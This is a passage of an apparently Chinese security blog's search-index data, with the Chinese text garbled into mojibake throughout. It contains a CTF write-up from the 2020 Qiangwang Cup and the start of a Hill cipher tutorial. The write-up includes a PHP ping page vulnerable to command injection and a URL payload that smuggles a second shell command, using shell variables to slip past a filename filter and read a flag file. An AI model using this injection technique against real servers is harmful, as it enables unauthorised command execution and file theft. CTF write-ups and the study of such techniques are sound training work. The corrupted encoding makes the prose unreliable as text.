255çš„å€¼ï¼Œè¿™æ—¶å°±å¯ä»¥è¿›è¡Œæšä¸¾cï¼Œä»0 ~255ä¸­æšä¸¾ï¼Œå“ªä¸€ä¸ªæ»¡è¶³è¿™ä¸ªè¡¨è¾¾å¼é‚£ä¹ˆcå°±ä¸ºé‚£ä¸ªã€‚ æœ‰äº†ä¸Šé¢çš„æ€è·¯ï¼Œå°±å¯ä»¥å†™è„šæœ¬äº†ï¼Œå…ˆå°†æ•°æ®åŒ…é‡Œçš„åŸå§‹æ•°æ®ä¿å­˜æˆdata.txtï¼Œç„¶åè¿è¡Œè„šæœ¬ï¼š import struct def decrypt(data, btime, fn, salt): funcs = { \"0\": lambda x, y: x - y, \"1\": lambda x, y: x + y, \"2\": lambda x, y: x ^ y } offset = { \"0\": 0xefffff, \"1\": 0xefffff, \"2\": 0xffffff, } t = struct.unpack(\"\u003ci\", btime)[0] boffset = offset[fn.decode()] t -= boffset t = struct.pack(\"\u003ci\", t) i = 0 for c in data: for ss in range(0, 256): if (funcs[fn.decode()](ss ^ t[i], salt) % 256) == c: print(chr(ss), end='') break i = (i + 1) % 4 f = open(\"data.txt\", \"r\") readlines = f.readlines() f.close() for i in range(0,len(readlines),5): data = readlines[i+3] btime = bytes.fromhex(readlines[i+1][:-1]) fn = bytes.fromhex(data[16:18]) salt = ord(bytes.fromhex(data[18:20])) data = bytes.fromhex(data[20:-1]) decrypt(data, btime, fn, salt) æœ€åè¿è¡Œçš„ç»“æœå¦‚ä¸‹ï¼Œ æŠŠæ¯ä¸€ä¸ªå­—ç¬¦æå‡ºæ¥åŠ ä¸ŠQWB{}å°±å¾—åˆ°flagï¼š image-20200824030245817 \" ","date":"2020-08-24","objectID":"/2020/08/qwb-2020-writeup/:5:0","tags":["å¼ºç½‘æ¯"],"title":"å¼ºç½‘æ¯2020éƒ¨åˆ†WriteUp","uri":"/2020/08/qwb-2020-writeup/"},{"categories":["CTF"],"content":"å¼ºç½‘å…ˆé”‹â€”â€”ä¸»åŠ¨ æ‰“å¼€é“¾æ¥å¾—åˆ°æºç ï¼š \u003c?php highlight_file(\"index.php\"); if(preg_match(\"/flag/i\", $_GET[\"ip\"])) { die(\"no flag\"); } system(\"ping -c 3 $_GET[ip]\"); ?\u003e å¾ˆåŸºç¡€çš„å‘½ä»¤æ‰§è¡Œï¼Œå…ˆæŸ¥çœ‹å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼š image-20200823173950037 \" å¯çœ‹åˆ°flag.phpåœ¨å½“å‰ç›®å½•ä¸‹ï¼Œä½†æ˜¯å› ä¸ºä¸Šé¢çš„æ­£åˆ™è¡¨è¾¾å¼æ— æ³•ç›´æ¥è¯»å–æ–‡ä»¶ï¼Œè¿™é‡Œåˆ©ç”¨ Linux çš„å˜é‡æœºåˆ¶æ¥ç»•è¿‡æ­£åˆ™ï¼š image-20200823175004665 \" Payloadï¼š?ip=8.8.8.8;a=\"fla\";b=\"g.php\";cat%20\"./\"$a$b é“¾æ¥ ç›¸å…³é¢˜ç›®ï¼šå¼ºç½‘æ¯2020WriteUpç›¸å…³é¢˜ç›®.zip ","date":"2020-08-24","objectID":"/2020/08/qwb-2020-writeup/:6:0","tags":["å¼ºç½‘æ¯"],"title":"å¼ºç½‘æ¯2020éƒ¨åˆ†WriteUp","uri":"/2020/08/qwb-2020-writeup/"},{"categories":["CTF"],"content":"Hill Cipher","date":"2020-08-08","objectID":"/2020/08/hill-cipher-study/","tags":["å¯†ç å­¦"],"title":"å…³äºå¸Œå°”å¯†ç çš„ç®€å•ç ”ç©¶","uri":"/2020/08/hill-cipher-study/"},{"categories":["CTF"],"content":" ç”±äºå·¥ä½œéœ€è¦ï¼Œæ¥è§¦äº†CTFçš„Cryptoç±»å‹çš„é¢˜ç›®ï¼Œæ˜¯ä¸€é“å…³äºå¸Œå°”å¯†ç çš„é¢˜ç›®ï¼Œç”±äºæ²¡æœ‰ç©è¿‡è¿™ç±»é¢˜ç›®ï¼Œäºæ˜¯å°†è¿‡ç¨‹è®°å½•ä¸‹æ¥åšä¸ªç¬”è®°ã€‚ ","date":"2020-08-08","objectID":"/2020/08/hill-cipher-study/:0:0","tags":["å¯†ç å­¦"],"title":"å…³äºå¸Œå°”å¯†ç çš„ç®€å•ç ”ç©¶","uri":"/2020/08/hill-cipher-study/"},{"categories":["CTF"],"content":"1. å¸Œå°”å¯†ç æ¦‚è¦ ç®€å•çš„ä»‹ç»ä¸‹å¸Œå°”å¯†ç ã€‚å¸Œå°”å¯†ç å±äºå¤å…¸å¯†ç ï¼Œæ˜¯è¿ç”¨çŸ©é˜µåŸç†çš„æ›¿æ¢å¯†ç ï¼Œå‘æ˜è€…ä¸º Lester S. Hillï¼Œå‘æ˜æ—¶é—´æ˜¯ 1929 å¹´ã€‚å¸Œå°”å¯†ç åœ¨åŠ è§£å¯†è¿‡ç¨‹ä¸­ä¼šå¤§é‡ä½¿ç”¨åˆ°çº¿æ€§ä»£æ•°ä¸­çš„çŸ©é˜µçŸ¥è¯†ï¼Œæ‰€ä»¥å¯¹æ•°å­¦èƒ½åŠ›è¦æ±‚ä¼šé«˜ä¸€ç‚¹ã€‚ä¸‹é¢æ˜¯å­¦ä¹ å¸Œå°”å¯†ç çš„ä¸€äº›å‰æçŸ¥è¯†ç‚¹ï¼š å¸Œå°”å¯†ç ç»´åŸºç™¾ç§‘ï¼šhttps://en.wikipedia.org/wiki/Hill_cipher äº’è´¨ï¼šhttps://baike.baidu.com/item/%E4%BA%92%E8%B4%A8 çŸ©é˜µï¼šhttps://www.shuxuele.com/algebra/matrix-introduction.html çŸ©é˜µä¹˜æ³•ï¼šhttps://www.shuxuele.com/algebra/matrix-multiplying.html çŸ©é˜µçš„è¡Œåˆ—å¼ï¼šhttps://www.shuxuele.com/algebra/matrix-determinant.html é€†çŸ©é˜µï¼šhttps://www.shuxuele.com/algebra/matrix-inverse.html ä¼´éšçŸ©é˜µï¼šhttps://en.wikipedia.org/wiki/Adjugate_matrix æ¨¡é€†å…ƒï¼šhttps://en.wikipedia.org/wiki/Modular_multiplicative_inverse ä¸Šé¢è¿™äº›å‚è€ƒé“¾æ¥ï¼Œéƒ½å¯ä»¥çœ‹çœ‹ï¼Œå¸Œå°”å¯†ç çš„åŠ è§£å¯†éƒ½ä¼šæ¶‰åŠåˆ°è¿™äº›ã€‚å¯¹äºç»´åŸºç™¾ç§‘çš„ä¸œè¥¿ï¼Œå»ºè®®éƒ½çœ‹è‹±æ–‡ç‰ˆï¼Œä¸­æ–‡ç‰ˆå†™å¾—å¤ªçƒ‚ï¼Œå®Œå…¨ä¸çŸ¥é“å†™çš„å•¥ç©æ„å„¿ã€‚ ","date":"2020-08-08","objectID":"/2020/08/hill-cipher-study/:1:0","tags":["å¯†ç å­¦"],"title":"å…³äºå¸Œå°”å¯†ç çš„ç®€å•ç ”ç©¶","uri":"/2020/08/hill-cipher-study/"},{"categories":["CTF"],"content":"2. å¸Œå°”å¯†ç çš„åŠ å¯† å…ˆæ¥å­¦ä¹ å¸Œå°”å¯†ç çš„åŠ å¯†æ­¥éª¤ã€‚ ","date":"2020-08-08","objectID":"/2020/08/hill-cipher-study/:2:0","tags":["å¯†ç å­¦"],"title":"å…³äºå¸Œå°”å¯†ç çš„ç®€å•ç ”ç©¶","uri":"/2020/08/hill-cipher-study/"},{"categories":["CTF"],"content":"å‰æå‡†å¤‡ åœ¨åŠ å¯†å¼€å§‹ä¹‹å‰ï¼Œé¦–å…ˆå¾—å‡†å¤‡ä¸€äº›ä¸œè¥¿ï¼š æ›¿æ¢è¡¨ï¼šå¸Œå°”å¯†ç å±äºæ›¿æ¢å¯†ç ï¼Œæ‰€ä»¥å¿…é¡»å¾—å…ˆæœ‰ä¸€å¼ æ›¿æ¢è¡¨ï¼Œè¿™é‡Œè®¾ç½®çš„æ›¿æ¢è¡¨å¦‚ä¸‹ \\[ \\begin{array}{cc} a \u0026 b \u0026 c \u0026 d \u0026 e \u0026 f \u0026 g \u0026 h \u0026 i \u0026 j \u0026 k \u0026 l \u0026 m \u0026 n \\\\ 0 \u0026 1 \u0026 2 \u0026 3 \u0026 4 \u0026 5 \u0026 6 \u0026 7 \u0026 8 \u0026 9 \u0026 10 \u0026 11 \u0026 12 \u0026 13 \\end{array} \\] \\[ \\begin{array}{cc} o \u0026 p \u0026 q \u0026 r \u0026 s \u0026 t \u0026 u \u0026 v \u0026 w \u0026 x \u0026 y \u0026 z \\\\ 14 \u0026 15 \u0026 16 \u0026 17 \u0026 18 \u0026 19 \u0026 20 \u0026 21 \u0026 22 \u0026 23 \u0026 24 \u0026 25 \\end{array} \\] å¯†é’¥çŸ©é˜µçš„ç»´æ•°ï¼šå¸Œå°”å¯†ç çš„åŠ è§£å¯†éƒ½æ˜¯ä¾é å¯†é’¥çŸ©é˜µçš„ï¼Œè§„å®šå¯†é’¥çŸ©é˜µéœ€ä¸ºæ–¹å—çŸ©é˜µï¼Œä¹Ÿå°±æ˜¯n x nçš„çŸ©é˜µï¼Œéœ€ç¬¬ä¸€æ—¶é—´ç¡®å®šnçš„å€¼ã€‚è¿™é‡Œè®¾ç½®å¯†é’¥çŸ©é˜µä¸º 2 ç»´çŸ©é˜µï¼Œä¹Ÿå°±æ˜¯ 2 x 2çš„çŸ©é˜µ æ˜æ–‡ä¿¡æ¯ï¼šè¿™é‡Œè®¾ç½®æ˜æ–‡ä¿¡æ¯ä¸ºhelloworld å¯†é’¥ä¿¡æ¯ï¼šè¿™é‡Œè®¾ç½®å¯†é’¥ä¸ºhill åœ¨è¿™é‡Œè¿˜æœ‰ä¸ªæ­¥éª¤ï¼Œå°±æ˜¯éœ€è¦æ ¡éªŒå¯†é’¥æ˜¯å¦å¯é€†ï¼Œåé¢ä¼šä¸“é—¨è®²è¿™ä¸ªç‚¹ ","date":"2020-08-08","objectID":"/2020/08/hill-cipher-study/:2:1","tags":["å¯†ç å­¦"],"title":"å…³äºå¸Œå°”å¯†ç çš„ç®€å•ç ”ç©¶","uri":"/2020/08/hill-cipher-study/"},{"categories":["CTF"],"content":"çŸ©é˜µè½¬æ¢ é¦–å…ˆå…ˆå°†å¯†é’¥ä¿¡æ¯è½¬æ¢ä¸ºå¯†é’¥çŸ©é˜µã€‚è½¬æ¢å¯†é’¥çŸ©é˜µæ—¶ï¼Œéœ€è¦æ ¹æ®æœ€åˆè®¾ç½®çš„å¯†é’¥çŸ©é˜µç»´æ•°æ¥è¿›è¡Œè½¬æ¢ï¼Œå°†å¯†é’¥ä»¥æ¨ªå‘çš„æ–¹å¼ä¾æ¬¡å˜æ¢æˆçŸ©é˜µï¼Œå¦‚ä¸‹ï¼š \\[ \\begin{pmatrix} h \u0026 i \\\\ l \u0026 l \\end{pmatrix} \\] åœ¨å¯†é’¥è½¬æ¢æˆå¯†é’¥çŸ©é˜µæ—¶ï¼Œéœ€è¦æ³¨æ„ä¸¤ç‚¹ï¼š å¯†é’¥æ˜¯æ¨ªå‘å¡«å……åˆ°çŸ©é˜µä¸­çš„ å¦‚æœå¯†é’¥çš„é•¿åº¦ä¸å¤Ÿå¡«å……å¯†é’¥çŸ©é˜µæ—¶ï¼Œéœ€ç”¨æ›¿æ¢è¡¨ä¸­çš„å­—æ¯ä¾æ¬¡å¡«å……ã€‚å¦‚æœå¯†é’¥çš„é•¿åº¦è¶…å‡ºçŸ©é˜µæ•°é‡æ—¶ï¼Œåˆ™åªå–ç›¸åº”é•¿åº¦çš„å¯†é’¥å¡«å……å³å¯ ä¸¾ä¾‹ï¼š å¯†é’¥çŸ©é˜µçš„ç»´åº¦è®¾ç½®ä¸º 2ï¼Œå¯†é’¥ä¸ºiceï¼Œæ›¿æ¢è¡¨è¿˜æ˜¯ä¸Šé¢é‚£ä¸ªã€‚å› ä¸ºå¯†é’¥é•¿åº¦ä¸å¤Ÿå¡«å……çŸ©é˜µï¼Œéœ€è¦ç”¨æ›¿æ¢è¡¨ä¸­çš„å­—ç¬¦æ¥è¡¥è¶³ï¼Œå¦‚ä¸‹ï¼š \\[ \\begin{pmatrix} i \u0026 c \\\\ e \u0026 a \\end{pmatrix} \\] å¯†é’¥çŸ©é˜µçš„ç»´åº¦è®¾ç½®ä¸º 2ï¼Œå¯†é’¥ä¸ºgreenï¼Œæ›¿æ¢è¡¨è¿˜æ˜¯ä¸Šé¢é‚£ä¸ªã€‚å› ä¸ºå¯†é’¥é•¿åº¦è¶…å‡ºäº†çŸ©é˜µæ•°é‡ï¼Œæ‰€ä»¥åªæˆªå–ç›¸åº”çš„é•¿åº¦ï¼Œå¦‚ä¸‹ï¼š \\[ \\begin{pmatrix} g \u0026 r \\\\ e \u0026 e \\end{pmatrix} \\] å¾—åˆ°è½¬æ¢åçš„å¯†é’¥çŸ©é˜µä¹‹åï¼Œéœ€è¦å°†å…¶æŒ‰ç…§æ›¿æ¢è¡¨æ›¿æ¢ä¸ºæ•°å­—å‹çš„å¯†é’¥çŸ©é˜µï¼Œå¦‚ä¸‹ï¼š \\[ \\begin{pmatrix} 7 \u0026 8 \\\\ 11 \u0026 11 \\end{pmatrix} \\] å¾—åˆ°å¯†é’¥çŸ©é˜µä¹‹åï¼Œç°åœ¨æ¥è¿›è¡Œæ˜æ–‡çš„çŸ©é˜µè½¬æ¢ã€‚æ˜æ–‡çš„çŸ©é˜µï¼Œè¡Œæ•°éœ€å’Œå¯†é’¥çŸ©é˜µç»´åº¦ç›¸åŒï¼Œå¹¶ä¸”æ˜¯ä»¥çºµå‘çš„æ–¹å¼è¿›è¡ŒçŸ©é˜µå¡«å……çš„ï¼Œå¦‚ä¸‹ï¼š \\[ \\begin{pmatrix} h \u0026 l \u0026 o \u0026 o \u0026 l \\\\ e \u0026 l \u0026 w \u0026 r \u0026 d \\end{pmatrix} \\] åœ¨æ˜æ–‡è½¬æ¢æˆçŸ©é˜µæ—¶ï¼Œéœ€è¦æ³¨æ„ä¸¤ç‚¹ï¼š æ˜æ–‡æ˜¯çºµå‘å¡«å……åˆ°çŸ©é˜µä¸­çš„ å¦‚æœæ˜æ–‡çš„é•¿åº¦ä¸å¤Ÿå¡«å……çŸ©é˜µæ—¶ï¼Œéœ€è¦ç”¨xè¡¥è¶³ ä¸¾ä¾‹ï¼š å¯†é’¥çŸ©é˜µçš„ç»´åº¦è®¾ç½®ä¸º 2ï¼Œæ˜æ–‡ä¸ºhelloï¼Œæ›¿æ¢è¡¨è¿˜æ˜¯ä¸Šé¢é‚£ä¸ªã€‚å› ä¸ºæ˜æ–‡é•¿åº¦ä¸å¤Ÿå¡«å……çŸ©é˜µï¼Œéœ€è¦ç”¨xæ¥è¡¥è¶³ï¼Œå¦‚ä¸‹ï¼š \\[ \\begin{pmatrix} h \u0026 l \u0026 o \\\\ e \u0026 l \u0026 x \\end{pmatrix} \\] å°†æ˜æ–‡çŸ©é˜µè½¬æ¢ä¸ºæ•°å­—å‹çš„æ˜æ–‡çŸ©é˜µï¼Œå¦‚ä¸‹ï¼š \\[ \\begin{pmatrix} 7 \u0026 11 \u0026 14 \u0026 14 \u0026 11 \\\\ 4 \u0026 11 \u0026 22 \u0026 17 \u0026 3 \\end{pmatrix} \\] ç”±æ­¤ï¼Œä¸¤ä¸ªéœ€è¦çš„çŸ©é˜µéƒ½æœ‰äº†ä¹‹åï¼Œç°åœ¨å¯ä»¥æ­£å¼å¼€å§‹è¿›è¡ŒåŠ å¯†äº†ã€‚ ","date":"2020-08-08","objectID":"/2020/08/hill-cipher-study/:2:2","tags":["å¯†ç å­¦"],"title":"å…³äºå¸Œå°”å¯†ç çš„ç®€å•ç ”ç©¶","uri":"/2020/08/hill-cipher-study/"},{"categories":["CTF"],"content":"æ­£å¼åŠ å¯† å¸Œå°”å¯†ç åŠ å¯†ï¼Œéœ€è¦ç”¨å¯†é’¥çŸ©é˜µä¸æ˜æ–‡çŸ©é˜µçš„æ¯ä¸€ä¸ªåˆ—å‘é‡(column vector)ç›¸ä¹˜ï¼Œæ‰€ä»¥å…ˆå°†æ˜æ–‡çŸ©é˜µåˆ†å‰²æˆåˆ—å‘é‡çš„å½¢å¼ï¼Œå¦‚ä¸‹ï¼š \\[ \\begin{pmatrix} 7 \\\\ 4 \\end{pmatrix} \\begin{pmatrix} 11 \\\\ 11 \\end{pmatrix} \\begin{pmatrix} 14 \\\\ 22 \\end{pmatrix} \\begin{pmatrix} 14 \\\\ 17 \\end{pmatrix} \\begin{pmatrix} 11 \\\\ 3 \\end{pmatrix} \\] ç„¶åå°†å¯†é’¥çŸ©é˜µå’Œæ¯ä¸€ä¸ªåˆ—å‘é‡ç›¸ä¹˜ï¼Œå¦‚ä¸ç¬¬ä¸€ä¸ªåˆ—å‘é‡ç›¸ä¹˜ï¼Œå°±åƒè¿™æ ·ï¼š \\[ \\begin{pmatrix} 7 \u0026 8 \\\\ 11 \u0026 11 \\end{pmatrix} \\begin{pmatrix} 7 \\\\ 4 \\end{pmatrix} \\] è€Œç›¸ä¹˜çš„æ–¹å¼å°±æ˜¯çŸ©é˜µçš„ä¹˜æ³•æ–¹å¼ï¼Œ2 x 2çš„çŸ©é˜µä¹˜æ³•å¦‚ä¸‹ï¼š \\[ \\begin{pmatrix} a \u0026 b \\\\ c \u0026 d \\end{pmatrix} \\begin{pmatrix} x \\\\ y \\end{pmatrix} = \\begin{pmatrix} ax \u0026 + \u0026 by \\\\ cx \u0026 + \u0026 dy \\end{pmatrix} \\] è½¬æ¢ä¸ºå¯†é’¥å’Œåˆ—å‘é‡çš„è¯ï¼Œå°±åƒä¸‹é¢è¿™æ ·ï¼š \\[ \\begin{pmatrix} 7 \u0026 8 \\\\ 11 \u0026 11 \\end{pmatrix} \\begin{pmatrix} 7 \\\\ 4 \\end{pmatrix} = \\begin{pmatrix} 7\\times7 \u0026 + \u0026 8\\times4 \\\\ 11\\times7 \u0026 + \u0026 11\\times4 \\end{pmatrix} = \\begin{pmatrix} 81 \\\\ 121 \\end{pmatrix} \\] å¾—åˆ°ç›¸ä¹˜åçš„ç»“æœä¹‹åï¼Œå†å°†å…¶ä¸ 26 ç›¸æ¨¡ï¼Œå¦‚ä¸‹ï¼š \\[ \\begin{pmatrix} 81 \\\\ 121 \\end{pmatrix} \\equiv \\begin{pmatrix} 3 \\\\ 17 \\end{pmatrix} \\mod 26 \\] æœ€åå°†æ•°å­—è½¬æ¢æˆæ›¿æ¢è¡¨ä¸­çš„å­—ç¬¦å³å¯ï¼Œå¦‚ä¸‹ï¼š \\[ \\begin{pmatrix} 3 \\\\ 17 \\end{pmatrix} = \\begin{pmatrix} d \\\\ r \\end{pmatrix} \\] ","date":"2020-08-08","objectID":"/2020/08/hill-cipher-study/:2:3","tags":["å¯†ç å­¦"],"title":"å…³äºå¸Œå°”å¯†ç çš„ç®€å•ç ”ç©¶","uri":"/2020/08/hill-cipher-study/"},{"categories":["CTF"],"content":"æœ€ç»ˆç»“æœ æ ¹æ®ä¸Šé¢çš„åŠ å¯†æ­¥éª¤ï¼Œè®¡ç®—å‡ºæ‰€æœ‰çš„å¯†æ–‡ï¼Œå¦‚ä¸‹ï¼š \\[ \\begin{pmatrix} h \u0026 i \\\\ l \u0026 l \\end{pmatrix} \\begin{pmatrix} h \\\\ e \\end{pmatrix} \\equiv \\begin{pmatrix} 7 \u0026 8 \\\\ 11 \u0026 11 \\end{pmatrix} \\begin{pmatrix} 7 \\\\ 4 \\end{pmatrix} \\equiv \\begin{pmatrix} 7\\times7 \u0026 + \u0026 8\\times4 \\\\ 11\\times7 \u0026 + \u0026 11\\times4 \\end{pmatrix} \\equiv \\begin{pmatrix} 81 \\\\ 121 \\end{pmatrix} \\equiv \\begin{pmatrix} 3 \\\\ 17 \\end{pmatrix} \\mod 26 = \\begin{pmatrix} d \\\\ r \\end{pmatrix} \\] \\[ \\begin{pmatrix} h \u0026 i \\\\ l \u0026 l \\end{pmatrix} \\begin{pmatrix} l \\\\ l \\end{pmatrix} \\equiv \\begin{pmatrix} 7 \u0026 8 \\\\ 11 \u0026 11 \\end{pmatrix} \\begin{pmatrix} 11 \\\\ 11 \\end{pmatrix} \\equiv \\begin{pmatrix} 7\\times11 \u0026 + \u0026 8\\times11 \\\\ 11\\times11 \u0026 + \u0026 11\\times11 \\end{pmatrix} \\equiv \\begin{pmatrix} 165 \\\\ 242 \\end{pmatrix} \\equiv \\begin{pmatrix} 9 \\\\ 8 \\end{pmatrix} \\mod 26 = \\begin{pmatrix} j \\\\ i \\end{pmatrix} \\] \\[ \\begin{pmatrix} h \u0026 i \\\\ l \u0026 l \\end{pmatrix} \\begin{pmatrix} o \\\\ w \\end{pmatrix} \\equiv \\begin{pmatrix} 7 \u0026 8 \\\\ 11 \u0026 11 \\end{pmatrix} \\begin{pmatrix} 14 \\\\ 22 \\end{pmatrix} \\equiv \\begin{pmatrix} 7\\times14 \u0026 + \u0026 8\\times22 \\\\ 11\\times14 \u0026 + \u0026 11\\times22 \\end{pmatrix} \\equiv \\begin{pmatrix} 274 \\\\ 396 \\end{pmatrix} \\equiv \\begin{pmatrix} 14 \\\\ 6 \\end{pmatrix} \\mod 26 = \\begin{pmatrix} o \\\\ g \\end{pmatrix} \\] \\[ \\begin{pmatrix} h \u0026 i \\\\ l \u0026 l \\end{pmatrix} \\begin{pmatrix} o \\\\ r \\end{pmatrix} \\equiv \\begin{pmatrix} 7 \u0026 8 \\\\ 11 \u0026 11 \\end{pmatrix} \\begin{pmatrix} 14 \\\\ 17 \\end{pmatrix} \\equiv \\begin{pmatrix} 7\\times14 \u0026 + \u0026 8\\times17 \\\\ 11\\times14 \u0026 + \u0026 11\\times17 \\end{pmatrix} \\equiv \\begin{pmatrix} 234 \\\\ 341 \\end{pmatrix} \\equiv \\begin{pmatrix} 0 \\\\ 3 \\end{pmatrix} \\mod 26 = \\begin{pmatrix} a \\\\ d \\end{pmatrix} \\] \\[ \\begin{pmatrix} h \u0026 i \\\\ l \u0026 l \\end{pmatrix} \\begin{pmatrix} l \\\\ d \\end{pmatrix} \\equiv \\begin{pmatrix} 7 \u0026 8 \\\\ 11 \u0026 11 \\end{pmatrix} \\begin{pmatrix} 11 \\\\ 3 \\end{pmatrix} \\equiv \\begin{pmatrix} 7\\times11 \u0026 + \u0026 8\\times3 \\\\ 11\\times11 \u0026 + \u0026 11\\times3 \\end{pmatrix} \\equiv \\begin{pmatrix} 101 \\\\ 154 \\end{pmatrix} \\equiv \\begin{pmatrix} 23 \\\\ 24 \\end{pmatrix} \\mod 26 = \\begin{pmatrix} x \\\\ y \\end{pmatrix} \\] æœ€åï¼Œæ˜æ–‡ä¸ºhelloworldï¼Œå¯†é’¥ä¸ºhillçš„æƒ…å†µä¸‹ï¼Œå¸Œå°”å¯†ç åŠ å¯†åå¾—åˆ°çš„å¯†æ–‡ä¸ºdrjiogadxyã€‚ ","date":"2020-08-08","objectID":"/2020/08/hill-cipher-study/:2:4","tags":["å¯†ç å­¦"],"title":"å…³äºå¸Œå°”å¯†ç çš„ç®€å•ç ”ç©¶","uri":"/2020/08/hill-cipher-study/"},{"categories":["CTF"],"content":"3. å¸Œå°”å¯†ç çš„è§£å¯† ç°åœ¨æ¥å­¦ä¹ å¸Œå°”å¯†ç çš„è§£å¯†æ­¥éª¤ï¼Œç›¸å¯¹äºåŠ å¯†æ¥è¯´ï¼Œå¸Œå°”å¯†ç çš„è§£å¯†ä¼šç¨å¾®éš¾ä¸€äº›ã€‚ ","date":"2020-08-08","objectID":"/2020/08/hill-cipher-study/:3:0","tags":["å¯†ç å­¦"],"title":"å…³äºå¸Œå°”å¯†ç çš„ç®€å•ç ”ç©¶","uri":"/2020/08/hill-cipher-study/"},{"categories":["CTF"],"content":"å‰æå‡†å¤‡ å’ŒåŠ å¯†ä¸€æ ·ï¼Œåœ¨è§£å¯†ä¹‹å‰ï¼Œéœ€è¦å‡†å¤‡ä¸€äº›ä¸œè¥¿ï¼Œä¸åŠ å¯†å‡†å¤‡çš„ä¸œè¥¿å·®ä¸å¤šï¼Œå¦‚ä¸‹ï¼š æ›¿æ¢è¡¨ï¼šåŒåŠ å¯†ä¸€æ ·ï¼Œè§£å¯†åŒæ ·éœ€è¦ä¸€å¼ æ›¿æ¢è¡¨ï¼Œå¹¶ä¸”éœ€è¦å’ŒåŠ å¯†æ—¶çš„ä¸€è‡´ï¼Œå¦‚ä¸‹ \\[ \\begin{array}{cc} a \u0026 b \u0026 c \u0026 d \u0026 e \u0026 f \u0026 g \u0026 h \u0026 i \u0026 j \u0026 k \u0026 l \u0026 m \u0026 n \\\\ 0 \u0026 1 \u0026 2 \u0026 3 \u0026 4 \u0026 5 \u0026 6 \u0026 7 \u0026 8 \u0026 9 \u0026 10 \u0026 11 \u0026 12 \u0026 13 \\end{array} \\] \\[ \\begin{array}{cc} o \u0026 p \u0026 q \u0026 r \u0026 s \u0026 t \u0026 u \u0026 v \u0026 w \u0026 x \u0026 y \u0026 z \\\\ 14 \u0026 15 \u0026 16 \u0026 17 \u0026 18 \u0026 19 \u0026 20 \u0026 21 \u0026 22 \u0026 23 \u0026 24 \u0026 25 \\end{array} \\] å¯†é’¥çŸ©é˜µçš„ç»´æ•°ï¼šéœ€ä¸åŠ å¯†æ—¶çš„ä¸€è‡´ï¼Œè®¾ç½®å¯†é’¥çŸ©é˜µä¸º 2 ç»´çŸ©é˜µï¼Œä¹Ÿå°±æ˜¯ 2 x 2çš„çŸ©é˜µ å¯†æ–‡ä¿¡æ¯ï¼šæ³¨æ„è¿™é‡Œè®¾ç½®çš„æ˜¯å¯†æ–‡ä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯åˆšæ‰åŠ å¯†å¾—åˆ°çš„drjiogadxy å¯†é’¥ä¿¡æ¯ï¼šéœ€ä¸åŠ å¯†æ—¶çš„ä¸€è‡´ï¼Œè®¾ç½®å¯†é’¥ä¸ºhill ","date":"2020-08-08","objectID":"/2020/08/hill-cipher-study/:3:1","tags":["å¯†ç å­¦"],"title":"å…³äºå¸Œå°”å¯†ç çš„ç®€å•ç ”ç©¶","uri":"/2020/08/hill-cipher-study/"},{"categories":["CTF"],"content":"å¯†æ–‡çŸ©é˜µè½¬æ¢ è¿™é‡Œå…ˆå°†å¯†æ–‡è½¬æ¢æˆçŸ©é˜µï¼Œå¹¶ä¸”åˆ†å‰²æˆåˆ—å‘é‡çš„å½¢å¼ï¼Œå¦‚ä¸‹ï¼š \\[ \\begin{pmatrix} d \u0026 j \u0026 o \u0026 a \u0026 x \\\\ r \u0026 i \u0026 g \u0026 d \u0026 y \\end{pmatrix} = \\begin{pmatrix} 3 \u0026 9 \u0026 14 \u0026 0 \u0026 23 \\\\ 17 \u0026 8 \u0026 6 \u0026 3 \u0026 24 \\end{pmatrix} = \\begin{pmatrix} 3 \\\\ 17 \\end{pmatrix} \\begin{pmatrix} 9 \\\\ 8 \\end{pmatrix} \\begin{pmatrix} 14 \\\\ 6 \\end{pmatrix} \\begin{pmatrix} 0 \\\\ 3 \\end{pmatrix} \\begin{pmatrix} 23 \\\\ 24 \\end{pmatrix} \\] ","date":"2020-08-08","objectID":"/2020/08/hill-cipher-study/:3:2","tags":["å¯†ç å­¦"],"title":"å…³äºå¸Œå°”å¯†ç çš„ç®€å•ç ”ç©¶","uri":"/2020/08/hill-cipher-study/"},{"categories":["CTF"],"content":"æ±‚å–é€†çŸ©é˜µ åœ¨è§£å¯†è¿‡ç¨‹ä¸­ï¼Œæœ€é‡è¦çš„ä¸€æ­¥å°±æ˜¯æ±‚å¯†é’¥çŸ©é˜µçš„é€†çŸ©é˜µï¼Œæ±‚å¾—äº†é€†çŸ©é˜µä¹‹åï¼Œå…¶ä½™æ­¥éª¤å°±å’ŒåŠ å¯†æ­¥éª¤æ²¡ä»€ä¹ˆåŒºåˆ«äº†ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡ŒæŒ‡çš„é€†çŸ©é˜µä¸æ˜¯ä¸€èˆ¬çš„é€†çŸ©é˜µï¼Œä¸å¹³æ—¶æåˆ°çš„é€†çŸ©é˜µå¤§ä¸ç›¸åŒï¼Œè®¡ç®—æ–¹å¼ä¹Ÿå®Œå…¨ä¸ä¸€æ ·ã€‚ ä¸€èˆ¬é€†çŸ©é˜µçš„è®¡ç®—å…¬å¼å¦‚ä¸‹ï¼š \\[ A^{-1} = { \\frac {A^{*}}{|A|} } = { \\frac 1{|A|} } \\times A^{*} \\] å…¶ä¸­ $ A $ ä¸ºçŸ©é˜µï¼Œ$ A^{-1} $ ä¸º $ A $ çš„é€†çŸ©é˜µï¼Œ$ A^{*} $ ä¸º $ A $ çš„ä¼´éšçŸ©é˜µï¼Œ$ {|A|} $ ä¸º $ A $ çš„è¡Œåˆ—å¼ã€‚ è€Œå¸Œå°”å¯†ç å¯†é’¥çŸ©é˜µçš„é€†çŸ©é˜µè®¡ç®—å…¬å¼å¦‚ä¸‹ï¼š \\[ K^{-1} = d^{-1} \\times adj(K) \\] å…¶ä¸­ $ K $ ä¸ºå¯†é’¥çŸ©é˜µï¼Œ$ K^{-1} $ ä¸º $ K $ çš„é€†çŸ©é˜µï¼Œ$ d $ ä¸º $ K $ çš„è¡Œåˆ—å¼ï¼Œ$ adj(K) $ ä¸º $ K $ çš„ä¼´éšçŸ©é˜µã€‚ 